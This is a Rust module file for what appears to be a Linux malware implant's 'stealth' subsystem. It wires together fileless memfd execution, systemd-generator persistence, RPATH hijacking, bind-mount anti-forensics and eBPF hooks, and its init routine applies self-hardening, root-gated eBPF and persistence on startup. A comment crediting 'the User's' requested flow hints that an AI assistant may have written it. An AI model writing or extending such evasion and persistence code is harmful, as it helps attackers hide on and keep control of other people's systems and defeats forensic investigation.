pub mod memfd;
pub mod persistence;
pub mod hijack;
pub mod anti_forensics;
pub mod ebpf;

// Re-exports
#[cfg(target_os = "linux")]
pub use memfd::GhostExecutor;
#[cfg(target_os = "linux")]
pub use persistence::SystemdGenerator;
#[cfg(target_os = "linux")]
pub use hijack::RpathHijacker;
#[cfg(target_os = "linux")]
pub use anti_forensics::BindMounter;
#[cfg(target_os = "linux")]
pub use ebpf::EbpfManager;

use log::info;

/// Check and apply stealth - platform dispatcher calls this
#[cfg(target_os = "linux")]
pub fn check_and_apply_stealth() {
    // Get current executable path for self-hardening
    if let Ok(exe) = std::env::current_exe() {
        if let Some(path) = exe.to_str() {
            init(path);
        }
    }
}

/// Main entry point for Linux Stealth
#[cfg(target_os = "linux")]
pub fn init(argv0: &str) {
    info!("[Stealth] Initializing Linux Subsystems...");

    // 1. Applied Userland Techniques (Always safe)
    if let Ok(_) = RpathHijacker::inject_origin(argv0) {
        info!("[Stealth] Self-harden: RPATH injected.");
    }

    // 2. Check for Root & Apply eBPF
    // This strictly follows the User's "Root Check -> eBPF" flow
    EbpfManager::init();

    // 3. Persistence (If not already persistent)
    // In a real run we might check unrelated markers
    if let Err(e) = SystemdGenerator::install(argv0) {
        // Not fatal, might just be lack of permissions
        info!("[Stealth] Persistence install skipped: {}", e);
    }
}
